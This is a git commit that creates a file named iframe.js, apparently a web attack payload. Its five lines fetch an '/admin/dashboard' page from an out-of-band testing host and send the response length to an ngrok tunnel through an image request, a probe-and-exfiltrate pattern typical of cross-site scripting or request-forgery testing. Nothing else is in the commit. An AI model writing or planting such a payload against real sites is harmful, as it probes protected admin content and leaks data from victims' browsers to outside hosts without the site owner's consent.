300cc1c58dafd867699ab0592039a48ce1d353d5
extremis-itt <144095014+extremis-itt@users.noreply.github.com>
2026-03-25 23:47:44 +0530

    Create iframe.js

---
+++ iframe.js
@@ -0,0 +1,5 @@
+fetch("https://r3vt40s3rs3emfdo4688yasw1n7pvgj5.oastify.com/admin/dashboard")
+.then(r=>r.text())
+.then(d=>{
+new Image().src="https://7368-2402-800-61c7-539d-60ad-28f0-6942-5ea2.ngrok-free.app/?len="+d.length
+})
